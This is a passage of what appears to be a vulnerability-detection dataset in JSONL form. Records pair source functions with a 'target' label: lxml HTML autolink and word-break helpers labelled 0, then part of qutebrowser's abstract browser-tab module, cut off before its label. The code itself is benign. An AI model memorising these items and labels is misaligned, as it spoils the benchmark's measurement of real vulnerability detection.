host_regex in avoid_hosts:\n                    if host_regex.search(host):\n                        regex_pos = match.end()\n                        break\n                else:\n                    break\n            if match is None:\n                continue\n            if best_pos is None or match.start() < best_pos:\n                best_match = match\n                best_pos = match.start()\n        if best_match is None:\n            # No more matches\n            if links:\n                assert not links[-1].tail\n                links[-1].tail = text\n            else:\n                assert not leading_text\n                leading_text = text\n            break\n        link = best_match.group(0)\n        end = best_match.end()\n        if link.endswith('.') or link.endswith(','):\n            # These punctuation marks shouldn't end a link\n            end -= 1\n            link = link[:-1]\n        prev_text = text[:best_match.start()]\n        if links:\n            assert not links[-1].tail\n            links[-1].tail = prev_text\n        else:\n            assert not leading_text\n            leading_text = prev_text\n        anchor = factory('a')\n        anchor.set('href', link)\n        body = best_match.group('body')\n        if not body:\n            body = link\n        if body.endswith('.') or body.endswith(','):\n            body = body[:-1]\n        anchor.text = body\n        links.append(anchor)\n        text = text[end:]\n    return leading_text, links\n                \ndef autolink_html(html, *args, **kw):\n    result_type = type(html)\n    if isinstance(html, basestring):\n        doc = fromstring(html)\n    else:\n        doc = copy.deepcopy(html)\n    autolink(doc, *args, **kw)\n    return _transform_result(result_type, doc)\n\nautolink_html.__doc__ = autolink.__doc__\n\n############################################################\n## Word wrapping\n############################################################\n\n_avoid_word_break_elements = ['pre', 'textarea', 'code']\n_avoid_word_break_classes = ['nobreak']\n\ndef word_break(el, max_width=40,\n               avoid_elements=_avoid_word_break_elements,\n               avoid_classes=_avoid_word_break_classes,\n               break_character=unichr(0x200b)):\n    \"\"\"\n    Breaks any long words found in the body of the text (not attributes).\n\n    Doesn't effect any of the tags in avoid_elements, by default\n    ``<textarea>`` and ``<pre>``\n\n    Breaks words by inserting &#8203;, which is a unicode character\n    for Zero Width Space character.  This generally takes up no space\n    in rendering, but does copy as a space, and in monospace contexts\n    usually takes up space.\n\n    See http://www.cs.tut.fi/~jkorpela/html/nobr.html for a discussion\n    \"\"\"\n    # Character suggestion of &#8203 comes from:\n    #   http://www.cs.tut.fi/~jkorpela/html/nobr.html\n    if el.tag in _avoid_word_break_elements:\n        return\n    class_name = el.get('class')\n    if class_name:\n        dont_break = False\n        class_name = class_name.split()\n        for avoid in avoid_classes:\n            if avoid in class_name:\n                dont_break = True\n                break\n        if dont_break:\n            return\n    if el.text:\n        el.text = _break_text(el.text, max_width, break_character)\n    for child in el:\n        word_break(child, max_width=max_width,\n                   avoid_elements=avoid_elements,\n                   avoid_classes=avoid_classes,\n                   break_character=break_character)\n        if child.tail:\n            child.tail = _break_text(child.tail, max_width, break_character)\n\ndef word_break_html(html, *args, **kw):\n    result_type = type(html)\n    doc = fromstring(html)\n    word_break(doc, *args, **kw)\n    return _transform_result(result_type, doc)\n\ndef _break_text(text, max_width, break_character):\n    words = text.split()\n    for word in words:\n        if len(word) > max_width:\n            replacement = _insert_break(word, max_width, break_character)\n            text = text.replace(word, replacement)\n    return text\n\n_break_prefer_re = re.compile(r'[^a-z]', re.I)\n\ndef _insert_break(word, width, break_character):\n    orig_word = word\n    result = ''\n    while len(word) > width:\n        start = word[:width]\n        breaks = list(_break_prefer_re.finditer(start))\n        if breaks:\n            last_break = breaks[-1]\n            # Only walk back up to 10 characters to find a nice break:\n            if last_break.end() > width-10:\n                # FIXME: should the break character be at the end of the\n                # chunk, or the beginning of the next chunk?\n                start = word[:last_break.end()]\n        result += start + break_character\n        word = word[len(start):]\n    result += word\n    return result\n    \n", "target": 0}
{"idx": 1052, "func": "# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:\n\n# Copyright 2016-2020 Florian Bruhin (The Compiler) <mail@qutebrowser.org>\n#\n# This file is part of qutebrowser.\n#\n# qutebrowser is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# qutebrowser is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"Base class for a wrapper over QWebView/QWebEngineView.\"\"\"\n\nimport enum\nimport itertools\nimport typing\nimport functools\n\nimport attr\nfrom PyQt5.QtCore import (pyqtSignal, pyqtSlot, QUrl, QObject, QSizeF, Qt,\n                          QEvent, QPoint)\nfrom PyQt5.QtGui import QKeyEvent, QIcon\nfrom PyQt5.QtWidgets import QWidget, QApplication, QDialog\nfrom PyQt5.QtPrintSupport import QPrintDialog, QPrinter\nfrom PyQt5.QtNetwork import QNetworkAccessManager\n\nif typing.TYPE_CHECKING:\n    from PyQt5.QtWebKit import QWebHistory\n    from PyQt5.QtWebEngineWidgets import QWebEngineHistory\n\nimport pygments\nimport pygments.lexers\nimport pygments.formatters\n\nfrom qutebrowser.keyinput import modeman\nfrom qutebrowser.config import config\nfrom qutebrowser.utils import (utils, objreg, usertypes, log, qtutils,\n                               urlutils, message)\nfrom qutebrowser.misc import miscwidgets, objects, sessions\nfrom qutebrowser.browser import eventfilter\nfrom qutebrowser.qt import sip\n\nif typing.TYPE_CHECKING:\n    from qutebrowser.browser import webelem\n    from qutebrowser.browser.inspector import AbstractWebInspector\n\n\ntab_id_gen = itertools.count(0)\n\n\ndef create(win_id: int,\n           private: bool,\n           parent: QWidget = None) -> 'AbstractTab':\n    \"\"\"Get a QtWebKit/QtWebEngine tab object.\n\n    Args:\n        win_id: The window ID where the tab will be shown.\n        private: Whether the tab is a private/off the record tab.\n        parent: The Qt parent to set.\n    \"\"\"\n    # Importing modules here so we don't depend on QtWebEngine without the\n    # argument and to avoid circular imports.\n    mode_manager = modeman.instance(win_id)\n    if objects.backend == usertypes.Backend.QtWebEngine:\n        from qutebrowser.browser.webengine import webenginetab\n        tab_class = webenginetab.WebEngineTab\n    else:\n        from qutebrowser.browser.webkit import webkittab\n        tab_class = webkittab.WebKitTab\n    return tab_class(win_id=win_id, mode_manager=mode_manager, private=private,\n                     parent=parent)\n\n\ndef init() -> None:\n    \"\"\"Initialize backend-specific modules.\"\"\"\n    if objects.backend == usertypes.Backend.QtWebEngine:\n        from qutebrowser.browser.webengine import webenginetab\n        webenginetab.init()\n\n\nclass WebTabError(Exception):\n\n    \"\"\"Base class for various errors.\"\"\"\n\n\nclass UnsupportedOperationError(WebTabError):\n\n    \"\"\"Raised when an operation is not supported with the given backend.\"\"\"\n\n\nTerminationStatus = enum.Enum('TerminationStatus', [\n    'normal',\n    'abnormal',  # non-zero exit status\n    'crashed',   # e.g. segfault\n    'killed',\n    'unknown',\n])\n\n\n@attr.s\nclass TabData:\n\n    \"\"\"A simple namespace with a fixed set of attributes.\n\n    Attributes:\n        keep_icon: Whether the (e.g. cloned) icon should not be cleared on page\n                   load.\n        inspector: The QWebInspector used for this webview.\n        viewing_source: Set if we're currently showing a source view.\n                        Only used when sources are shown via pygments.\n        open_target: Where to open the next link.\n                     Only used for QtWebKit.\n        override_target: Override for open_target for fake clicks (like hints).\n                         Only used for QtWebKit.\n        pinned: Flag to pin the tab.\n        fullscreen: Whether the tab has a video shown fullscreen currently.\n        netrc_used: Whether netrc authentication was performed.\n        input_mode: current input mode for the tab.\n    \"\"\"\n\n    keep_icon = attr.ib(False)  # type: bool\n    viewing_source = attr.ib(False)  # type: bool\n    inspector = attr.ib(None)  # type: typing.Optional[AbstractWebInspector]\n    open_target = attr.ib(\n        usertypes.ClickTarget.normal)  # type: usertypes.ClickTarget\n    override_target = attr.ib(\n        None)  # type: typing.Optional[usertypes.ClickTarget]\n    pinned = attr.ib(False)  # type: bool\n    fullscreen = attr.ib(False)  # type: bool\n    netrc_used = attr.ib(False)  # type: bool\n    input_mode = attr.ib(usertypes.KeyMode.normal)  # type: usertypes.KeyMode\n    last_navigation = attr.ib(None)  # type: usertypes.NavigationRequest\n\n    def should_show_icon(self) -> bool:\n        return (config.val.tabs.favicons.show == 'always' or\n                config.val.tabs.favicons.show == 'pinned' and self.pinned)\n\n\nclass AbstractAction:\n\n    \"\"\"Attribute ``action`` of AbstractTab for Qt WebActions.\"\"\"\n\n    # The class actions are defined on (QWeb{Engine,}Page)\n    action_class = None  # type: type\n    # The type of the actions (QWeb{Engine,}Page.WebAction)\n    action_base = None  # type: type\n\n    def __init__(self, tab: 'AbstractTab') -> None:\n        self._widget = typing.cast(QWidget, None)\n        self._tab = tab\n\n    def exit_fullscreen(self) -> None:\n        \"\"\"Exit the fullscreen mode.\"\"\"\n        raise NotImplementedError\n\n    def save_page(self) -> None:\n        \"\"\"Save the current page.\"\"\"\n        raise NotImplementedError\n\n    def run_string(self, name: str) -> None:\n        \"\"\"Run a webaction based on its name.\"\"\"\n        member = getattr(self.action_class, name, None)\n        if not isinstance(member, self.action_base):\n            raise WebTabError(\"{} is not a valid web action!\".format(name))\n        self._widget.triggerPageAction(member)\n\n    def show_source(\n            self,\n            pygments: bool = False  # pylint: disable=redefined-outer-name\n    ) -> None:\n        \"\"\"Show the source of the current page in a new tab.\"\"\"\n        raise NotImplementedError\n\n    def _show_source_pygments(self) -> None:\n\n        def show_source_cb(source: str) -> None:\n            \"\"\"Show source as soon as it's ready.\"\"\"\n            # WORKAROUND for https://github.com/PyCQA/pylint/issues/491\n            # pylint: disable=no-member\n            lexer = pygments.lexers.HtmlLexer()\n            formatter = pygments.formatters.HtmlFormatter(\n                full=True, linenos='table')\n            # pylint: enable=no-member\n            highlighted = pygments.highlight(source, lexer, formatter)\n\n            tb = objreg.get('tabbed-browser', scope='window',\n                            window=self._tab.win_id)\n            new_tab = tb.tabopen(background=False, related=True)\n            new_tab.set_html(highlighted, self._tab.url())\n            new_tab.data.viewing_source = True\n\n        self._tab.dump_async(show_source_cb)\n\n\nclass AbstractPrinting:\n\n    \"\"\"Attribute ``printing`` of AbstractTab for printing the page.\"\"\"\n\n    def __init__(self, tab: 'AbstractTab') -> None:\n        self._widget = typing.cast(QWidget, None)\n        self._tab = tab\n\n    def check_pdf_support(self) -> None:\n        \"\"\"Check whether writing to PDFs is supported.\n\n        If it's not supported (by the current Qt version), a WebTabError is\n        raised.\n        \"\"\"\n        raise NotImplementedError\n\n    def check_printer_support(self) -> None:\n        \"\"\"Check whether writing to a printer is supported.\n\n        If it's not supported (by the current Qt version), a WebTabError is\n        raised.\n        \"\"\"\n        raise NotImplementedError\n\n    def check_preview_support(self) -> None:\n        \"\"\"Check whether showing a print preview is supported.\n\n        If it's not supported (by the current Qt version), a WebTabError is\n        raised.\n        \"\"\"\n        raise NotImplementedError\n\n    def to_pdf(self, filename: str) -> bool:\n        \"\"\"Print the tab to a PDF with the given filename.\"\"\"\n        raise NotImplementedError\n\n    def to_printer(self, printer: QPrinter,\n                   callback: typing.Callable[[bool], None] = None) -> None:\n        \"\"\"Print the tab.\n\n        Args:\n            printer: The QPrinter to print to.\n            callback: Called with a boolean\n                      (True if printing succeeded, False otherwise)\n        \"\"\"\n        raise NotImplementedError\n\n    def show_dialog(self) -> None:\n        \"\"\"Print with a QPrintDialog.\"\"\"\n        self.check_printer_support()\n\n        def print_callback(ok: bool) -> None:\n            \"\"\"Called when printing finished.\"\"\"\n            if not ok:\n                message.error(\"Printing failed!\")\n            diag.deleteLater()\n\n        def do_print() -> None:\n            \"\"\"Called when the dialog was closed.\"\"\"\n            self.to_printer(diag.printer(), print_callback)\n\n        diag = QPrintDialog(self._tab)\n        if utils.is_mac:\n            # For some reason we get a segfault when using open() on macOS\n            ret = diag.exec_()\n            if ret == QDialog.Accepted:\n                do_print()\n        else:\n            diag.open(do_print)\n\n\nclass AbstractSearch(QObject):\n\n    \"\"\"Attribute ``search`` of AbstractTab for doing searches.\n\n    Attributes:\n        text: The last thing this view was searched for.\n        search_displayed: Whether we're currently displaying search results in\n                          this view.\n        _flags: The flags of the last search (needs to be set by subclasses).\n        _widget: The underlying WebView widget.\n    \"\"\"\n\n    #: Signal emitted when a search was finished\n    #: (True if the text was found, False otherwise)\n    finished = pyqtSignal(bool)\n    #: Signal emitted when an existing search was cleared.\n    cleared = pyqtSignal()\n\n    _Callback = typing.Callable[[bool], None]\n\n    def __init__(self, tab: 'AbstractTab', parent: QWidget = None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = typing.cast(QWidget, None)\n        self.text = None  # type: typing.Optional[str]\n        self.search_displayed = False\n\n    def _is_case_sensitive(self, ignore_case: usertypes.IgnoreCase) -> bool:\n        \"\"\"Check if case-sensitivity should be used.\n\n        This assumes self.text is already set properly.\n\n        Arguments:\n            ignore_case: The ignore_case value from the config.\n        \"\"\"\n        assert self.text is not None\n        mapping = {\n            usertypes.IgnoreCase.smart: not self.text.islower(),\n            usertypes.IgnoreCase.never: True,\n            usertypes.IgnoreCase.always: False,\n        }\n        return mapping[ignore_case]\n\n    def search(self, text: str, *,\n               ignore_case: usertypes.IgnoreCase = usertypes.IgnoreCase.never,\n               reverse: bool = False,\n               wrap: bool = True,\n               result_cb: _Callback = None) -> None:\n        \"\"\"Find the given text on the page.\n\n        Args:\n            text: The text to search for.\n            ignore_case: Search case-insensitively.\n            reverse: Reverse search direction.\n            wrap: Allow wrapping at the top or bottom of the page.\n            result_cb: Called with a bool indicating whether a match was found.\n        \"\"\"\n        raise NotImplementedError\n\n    def clear(self) -> None:\n        \"\"\"Clear the current search.\"\"\"\n        raise NotImplementedError\n\n    def prev_result(self, *, result_cb: _Callback = None) -> None:\n        \"\"\"Go to the previous result of the current search.\n\n        Args:\n            result_cb: Called with a bool indicating whether a match was found.\n        \"\"\"\n        raise NotImplementedError\n\n    def next_result(self, *, result_cb: _Callback = None) -> None:\n        \"\"\"Go to the next result of the current search.\n\n        Args:\n            result_cb: Called with a bool indicating whether a match was found.\n        \"\"\"\n        raise NotImplementedError\n\n\nclass AbstractZoom(QObject):\n\n    \"\"\"Attribute ``zoom`` of AbstractTab for controlling zoom.\"\"\"\n\n    def __init__(self, tab: 'AbstractTab', parent: QWidget = None) -> None:\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = typing.cast(QWidget, None)\n        # Whether zoom was changed from the default.\n        self._default_zoom_changed = False\n        self._init_neighborlist()\n        config.instance.changed.connect(self._on_config_changed)\n        self._zoom_factor = float(config.val.zoom.default) / 100\n\n    @pyqtSlot(str)\n    def _on_config_changed(self, option: str) -> None:\n        if option in ['zoom.levels', 'zoom.default']:\n            if not self._default_zoom_changed:\n                factor = float(config.val.zoom.default) / 100\n                self.set_factor(factor)\n            self._init_neighborlist()\n\n    def _init_neighborlist(self) -> None:\n        \"\"\"Initialize self._neighborlist.\n\n        It is a NeighborList with the zoom levels.\"\"\"\n        levels = config.val.zoom.levels\n        self._neighborlist = usertypes.NeighborList(\n            levels, mode=usertypes.NeighborList.Modes.edge\n        )  # type: usertypes.NeighborList[float]\n        self._neighborlist.fuzzyval = config.val.zoom.default\n\n    def apply_offset(self, offset: int) -> float:\n        \"\"\"Increase/Decrease the zoom level by the given offset.\n\n        Args:\n            offset: The offset in the zoom level list.\n\n        Return:\n            The new zoom level.\n        \"\"\"\n        level = self._neighborlist.getitem(offset)\n        self.set_factor(float(level) / 100, fuzzyval=False)\n        return level\n\n    def _set_factor_internal(self, factor: float) -> None:\n        raise NotImplementedError\n\n    def set_factor(self, factor: float, *, fuzzyval: bool = True) -> None:\n        \"\"\"Zoom to a given zoom factor.\n\n        Args:\n            factor: The zoom factor as float.\n            fuzzyval: Whether to set the NeighborLists fuzzyval.\n        \"\"\"\n        if fuzzyval:\n            self._neighborlist.fuzzyval = int(factor * 100)\n        if factor < 0:\n            raise ValueError(\"Can't zoom to factor {}!\".format(factor))\n\n        default_zoom_factor = float(config.val.zoom.default) / 100\n        self._default_zoom_changed = (factor != default_zoom_factor)\n\n        self._zoom_factor = factor\n        self._set_factor_internal(factor)\n\n    def factor(self) -> float:\n        return self._zoom_factor\n\n    def apply_default(self) -> None:\n        self._set_factor_internal(float(config.val.zoom.default) / 100)\n\n    def reapply(self) -> None:\n        self._set_factor_internal(self._zoom_factor)\n\n\nclass AbstractCaret(QObject):\n\n    \"\"\"Attribute ``caret`` of AbstractTab for caret browsing.\"\"\"\n\n    #: Signal emitted when the selection was toggled.\n    #: (argument - whether the selection is now active)\n    selection_toggled = pyqtSignal(bool)\n    #: Emitted when a ``follow_selection`` action is done.\n    follow_selected_done = pyqtSignal()\n\n    def __init__(self,\n                 tab: 'AbstractTab',\n                 mode_manager: modeman.ModeManager,\n                 parent: QWidget = None) -> None:\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = typing.cast(QWidget, None)\n        self.selection_enabled = False\n        self._mode_manager = mode_manager\n        mode_manager.entered.connect(self._on_mode_entered)\n        mode_manager.left.connect(self._on_mode_left)\n\n    def _on_mode_entered(self, mode: usertypes.KeyMode) -> None:\n        raise NotImplementedError\n\n    def _on_mode_left(self, mode: usertypes.KeyMode) -> None:\n        raise NotImplementedError\n\n    def move_to_next_line(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_prev_line(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_next_char(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_prev_char(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_end_of_word(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_next_word(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_prev_word(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_start_of_line(self) -> None:\n        raise NotImplementedError\n\n    def move_to_end_of_line(self) -> None:\n        raise NotImplementedError\n\n    def move_to_start_of_next_block(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_start_of_prev_block(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_end_of_next_block(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_end_of_prev_block(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def move_to_start_of_document(self) -> None:\n        raise NotImplementedError\n\n    def move_to_end_of_document(self) -> None:\n        raise NotImplementedError\n\n    def toggle_selection(self) -> None:\n        raise NotImplementedError\n\n    def drop_selection(self) -> None:\n        raise NotImplementedError\n\n    def selection(self, callback: typing.Callable[[str], None]) -> None:\n        raise NotImplementedError\n\n    def reverse_selection(self) -> None:\n        raise NotImplementedError\n\n    def _follow_enter(self, tab: bool) -> None:\n        \"\"\"Follow a link by faking an enter press.\"\"\"\n        if tab:\n            self._tab.fake_key_press(Qt.Key_Enter, modifier=Qt.ControlModifier)\n        else:\n            self._tab.fake_key_press(Qt.Key_Enter)\n\n    def follow_selected(self, *, tab: bool = False) -> None:\n        raise NotImplementedError\n\n\nclass AbstractScroller(QObject):\n\n    \"\"\"Attribute ``scroller`` of AbstractTab to manage scroll position.\"\"\"\n\n    #: Signal emitted when the scroll position changed (int, int)\n    perc_changed = pyqtSignal(int, int)\n    #: Signal emitted before the user requested a jump.\n    #: Used to set the special ' mark so the user can return.\n    before_jump_requested = pyqtSignal()\n\n    def __init__(self, tab: 'AbstractTab', parent: QWidget = None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = typing.cast(QWidget, None)\n        if 'log-scroll-pos' in objects.debug_flags:\n            self.perc_changed.connect(self._log_scroll_pos_change)\n\n    @pyqtSlot()\n    def _log_scroll_pos_change(self) -> None:\n        log.webview.vdebug(  # type: ignore\n            \"Scroll position changed to {}\".format(self.pos_px()))\n\n    def _init_widget(self, widget: QWidget) -> None:\n        self._widget = widget\n\n    def pos_px(self) -> int:\n        raise NotImplementedError\n\n    def pos_perc(self) -> int:\n        raise NotImplementedError\n\n    def to_perc(self, x: int = None, y: int = None) -> None:\n        raise NotImplementedError\n\n    def to_point(self, point: QPoint) -> None:\n        raise NotImplementedError\n\n    def to_anchor(self, name: str) -> None:\n        raise NotImplementedError\n\n    def delta(self, x: int = 0, y: int = 0) -> None:\n        raise NotImplementedError\n\n    def delta_page(self, x: float = 0, y: float = 0) -> None:\n        raise NotImplementedError\n\n    def up(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def down(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def left(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def right(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def top(self) -> None:\n        raise NotImplementedError\n\n    def bottom(self) -> None:\n        raise NotImplementedError\n\n    def page_up(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def page_down(self, count: int = 1) -> None:\n        raise NotImplementedError\n\n    def at_top(self) -> bool:\n        raise NotImplementedError\n\n    def at_bottom(self) -> bool:\n        raise NotImplementedError\n\n\nclass AbstractHistoryPrivate:\n\n    \"\"\"Private API related to the history.\"\"\"\n\n    def __init__(self, tab: 'AbstractTab'):\n        self._tab = tab\n        self._history = typing.cast(\n            typing.Union['QWebHistory', 'QWebEngineHistory'], None)\n\n    def serialize(self) -> bytes:\n        \"\"\"Serialize into an opaque format understood by self.deserialize.\"\"\"\n        raise NotImplementedError\n\n    def deserialize(self, data: bytes) -> None:\n        \"\"\"Deserialize from a format produced by self.serialize.\"\"\"\n        raise NotImplementedError\n\n    def load_items(self, items: typing.Sequence) -> None:\n        \"\"\"Deserialize from a list of WebHistoryItems.\"\"\"\n        raise NotImplementedError\n\n\nclass AbstractHistory:\n\n    \"\"\"The history attribute of a AbstractTab.\"\"\"\n\n    def __init__(self, tab: 'AbstractTab') -> None:\n        self._tab = tab\n        self._history = typing.cast(\n            typing.Union['QWebHistory', 'QWebEngineHistory'], None)\n        self.private_api = AbstractHistoryPrivate(tab)\n\n    def __len__(self) -> int:\n        raise NotImplementedError\n\n    def __iter__(self) -> typing.Iterable:\n        raise NotImplementedError\n\n    def _check_count(self, count: int) -> None:\n        \"\"\"Check whether the count is positive.\"\"\"\n        if count < 0:\n            raise WebTabError(\"count needs to be positive!\")\n\n    def current_idx(self) -> int:\n        raise NotImplementedError\n\n    def back(self, count: int = 1) -> None:\n        \"\"\"Go back in the tab's history.\"\"\"\n        self._check_count(count)\n        idx = self.current_idx() - count\n        if idx >= 0:\n            self._go_to_item(self._item_at(idx))\n        else:\n            self._go_to_item(self._item_at(0))\n            raise WebTabError(\"At beginning of history.\")\n\n    def forward(self, count: int = 1) -> None:\n        \"\"\"Go forward in the tab's history.\"\"\"\n        self._check_count(count)\n        idx = self.current_idx() + count\n        if idx < len(self):\n            self._go_to_item(self._item_at(idx))\n        else:\n            self._go_to_item(self._item_at(len(self) - 1))\n            raise WebTabError(\"At end of history.\")\n\n    def can_go_back(self) -> bool:\n        raise NotImplementedError\n\n    def can_go_forward(self) -> bool:\n        raise NotImplementedError\n\n    def _item_at(self, i: int) -> typing.Any:\n        raise NotImplementedError\n\n    def _go_to_item(self, item: typing.Any) -> None:\n        raise NotImplementedError\n\n\nclass AbstractElements:\n\n    \"\"\"Finding and handling of elements on the page.\"\"\"\n\n    _MultiCallback = typing.Callable[\n        [typing.Sequence['webelem.AbstractWebElement']], None]\n    _SingleCallback = typing.Callable[\n        [typing.Optional['webelem.AbstractWebElement']], None]\n    _ErrorCallback = typing.Callable[[Exception], None]\n\n    def __init__(self, tab: 'AbstractTab') -> None:\n        self._widget = typing.cast(QWidget, None)\n        self._tab = tab\n\n    def find_css(self, selector: str,\n                 callback: _MultiCallback,\n                 error_cb: _ErrorCallback, *,\n                 only_visible: bool = False) -> None:\n        \"\"\"Find all HTML elements matching a given selector async.\n\n        If there's an error, the callback is called with a webelem.Error\n        instance.\n\n        Args:\n            callback: The callback to be called when the search finished.\n            error_cb: The callback to be called when an error occurred.\n            selector: The CSS selector to search for.\n            only_visible: Only show elements which are visible on screen.\n        \"\"\"\n        raise NotImplementedError\n\n    def find_id(self, elem_id: str, callback: _SingleCallback) -> None:\n        \"\"\"Find the HTML element with the given ID async.\n\n        Args:\n            callback: The callback to be called when the search finished.\n                      Called with a WebEngineElement or None.\n            elem_id: The ID to search for.\n        \"\"\"\n        raise NotImplementedError\n\n    def find_focused(self, callback: _SingleCallback) -> None:\n        \"\"\"Find the focused element on the page async.\n\n        Args:\n            callback: The callback to be called when the search finished.\n                      Called with a WebEngineElement or None.\n        \"\"\"\n        raise NotImplementedError\n\n    def find_at_pos(self, pos: QPoint, callback: _SingleCallback) -> None:\n        \"\"\"Find the element at the given position async.\n\n        This is also called \"hit test\" elsewhere.\n\n        Args:\n            pos: The QPoint to get the element for.\n            callback: The callback to be called when the search finished.\n                      Called with a WebEngineElement or None.\n        \"\"\"\n        raise NotImplementedError\n\n\nclass AbstractAudio(QObject):\n\n    \"\"\"Handling of audio/muting for this tab.\"\"\"\n\n    muted_changed = pyqtSignal(bool)\n    recently_audible_changed = pyqtSignal(bool)\n\n    def __init__(self, tab: 'AbstractTab', parent: QWidget = None) -> None:\n        super().__init__(parent)\n        self._widget = typing.cast(QWidget, None)\n        self._tab = tab\n\n    def set_muted(self, muted: bool, override: bool = False) -> None:\n        \"\"\"Set this tab as muted or not.\n\n        Arguments:\n            override: If set to True, muting/unmuting was done manually and\n                      overrides future automatic mute/unmute changes based on\n                      the URL.\n        \"\"\"\n        raise NotImplementedError\n\n    def is_muted(self) -> bool:\n        raise NotImplementedError\n\n    def is_recently_audible(self) -> bool:\n        \"\"\"Whether this tab has had audio playing recently.\"\"\"\n        raise NotImplementedError\n\n\nclass AbstractTabPrivate:\n\n    \"\"\"Tab-related methods which are only needed in the core.\n\n    Those methods are not part of the API which is exposed to extensions, and\n    should ideally be removed at some point in the future.\n    \"\"\"\n\n    def __init__(self, mode_manager: modeman.ModeManager,\n                 tab: 'AbstractTab') -> None:\n        self._widget = typing.cast(QWidget, None)\n        self._tab = tab\n        self._mode_manager = mode_manager\n\n    def event_target(self) -> QWidget:\n        \"\"\"Return the widget events should be sent to.\"\"\"\n        raise NotImplementedError\n\n    def handle_auto_insert_mode(self, ok: bool) -> None:\n        \"\"\"Handle `input.insert_mode.auto_load` after loading finished.\"\"\"\n        if not ok or not config.cache['input.insert_mode.auto_load']:\n            return\n\n        cur_mode = self._mode_manager.mode\n        if cur_mode == usertypes.KeyMode.insert:\n            return\n\n        def _auto_insert_mode_cb(\n                elem: typing.Optional['webelem.AbstractWebElement']\n        ) -> None:\n            \"\"\"Called from JS after finding the focused element.\"\"\"\n            if elem is None:\n                log.webview.debug(\"No focused element!\")\n                return\n            if elem.is_editable():\n                modeman.enter(self._tab.win_id, usertypes.KeyMode.insert,\n                              'load finished', only_if_normal=True)\n\n        self._tab.elements.find_focused(_auto_insert_mode_cb)\n\n    def clear_ssl_errors(self) -> None:\n        raise NotImplementedError\n\n    def networkaccessmanager(self) -> typing.Optional[QNetworkAccessManager]:\n        \"\"\"Get the QNetworkAccessManager for this tab.\n\n        This is only implemented for QtWebKit.\n        For QtWebEngine, always returns None.\n        \"\"\"\n        raise NotImplementedError\n\n    def shutdown(self) -> None:\n        raise NotImplementedError\n\n\nclass AbstractTab(QWidget):\n\n    \"\"\"An adapter for QWebView/QWebEngineView representing a single tab.\"\"\"\n\n    #: Signal emitted when a website requests to close this tab.\n    window_close_requested = pyqtSignal()\n    #: Signal emitted when a link is hovered (the hover text)\n    link_hovered = pyqtSignal(str)\n    #: Signal emitted when a page started loading\n    load_started = pyqtSignal()\n    #: Signal emitted when a page is loading (progress percentage)\n    load_progress = pyqtSignal(int)\n    #: Signal emitted when a page finished loading (success as bool)\n    load_finished = pyqtSignal(bool)\n    #: Signal emitted when a page's favicon changed (icon as QIcon)\n    icon_changed = pyqtSignal(QIcon)\n    #: Signal emitted when a page's title changed (new title as str)\n    title_changed = pyqtSignal(str)\n    #: Signal emitted when a new tab should be opened (url as QUrl)\n    new_tab_requested = pyqtSignal(QUrl)\n    #: Signal emitted when a page's URL changed (url as QUrl)\n    url_changed = pyqtSignal(QUrl)\n    #: Signal emitted when a tab's content size changed\n    #: (new size as QSizeF)\n    contents_size_changed = pyqtSignal(QSizeF)\n    #: Signal emitted when a page requested full-screen (bool)\n    fullscreen_requested = pyqtSignal(bool)\n    #: Signal emitted before load starts (URL as QUrl)\n    before_load_started = pyqtSignal(QUrl)\n\n    # Signal emitted when a page's load status changed\n    # (argument: usertypes.LoadStatus)\n    load_status_changed = pyqtSignal(usertypes.LoadStatus)\n    # Signal emitted before shutting down\n    shutting_down = pyqtSignal()\n    # Signal emitted when a history item should be added\n    history_item_triggered = pyqtSignal(QUrl, QUrl, str)\n    # Signal emitted when the underlying renderer process terminated.\n    # arg 0: A TerminationStatus member.\n    # arg 1: The exit code.\n    renderer_process_terminated = pyqtSignal(TerminationStatus, int)\n\n    def __init__(self, *, win_id: int, private: bool,\n                 parent: QWidget = None) -> None:\n        self.is_private = private\n        self.win_id = win_id\n        self.tab_id = next(tab_id_gen)\n        super().__init__(parent)\n\n        self.registry = objreg.ObjectRegistry()\n        tab_registry = objreg.get('tab-registry', scope='window',\n                                  window=win_id)\n        tab_registry[self.tab_id] = self\n        objreg.register('tab', self, registry=self.registry)\n\n        self.data = TabData()\n        self._layout = miscwidgets.WrapperLayout(self)\n        self._widget = typing.cast(QWidget, None)\n        self._progress = 0\n        self._has_ssl_errors = False\n        self._load_status = usertypes.LoadStatus.none\n        self._tab_event_filter = eventfilter.TabEventFilter(\n            self, parent=self)\n        self.backend = None  # type: typing.Optional[usertypes.Backend]\n\n        # If true, this tab has been requested to be removed (or is removed).\n        self.pending_removal = False\n        self.shutting_down.connect(functools.partial(\n            setattr, self, 'pending_removal', True))\n\n        self.before_load_started.connect(self._on_before_load_started)\n\n    def _set_widget(self, widget: QWidget) -> None:\n        # pylint: disable=protected-access\n        self._widget = widget\n        self._layout.wrap(self, widget)\n        self.history._history = widget.history()\n        self.history.private_api._history = widget.history()\n        